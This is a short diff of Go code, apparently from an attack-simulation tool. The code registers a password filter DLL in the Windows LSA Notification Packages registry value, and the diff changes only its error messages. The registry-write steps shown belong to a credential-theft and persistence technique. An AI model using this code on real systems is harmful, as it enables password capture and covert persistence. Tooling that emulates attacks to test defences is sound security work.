@@ -90,7 +90,7 @@ func performTechnique() error {
 
 	key, err := registry.OpenKey(registry.LOCAL_MACHINE, LSA_REG_PATH, registry.QUERY_VALUE|registry.SET_VALUE)
 	if err != nil {
-		return fmt.Errorf("LSA registry access denied: %v (EDR or permissions blocked access)", err)
+		return fmt.Errorf("failed to open LSA registry key: %v", err)
 	}
 	defer key.Close()
 
@@ -123,7 +123,7 @@ func performTechnique() error {
 
 		err = key.SetStringsValue(NOTIFICATION_VALUE, newPackages)
 		if err != nil {
-			return fmt.Errorf("password filter DLL registration blocked: %v (EDR prevented LSA registry modification)", err)
+			return fmt.Errorf("failed to register password filter DLL: %v", err)
 		}
 
 		LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("Password filter DLL registered in LSA: %s", FILTER_DLL_NAME))
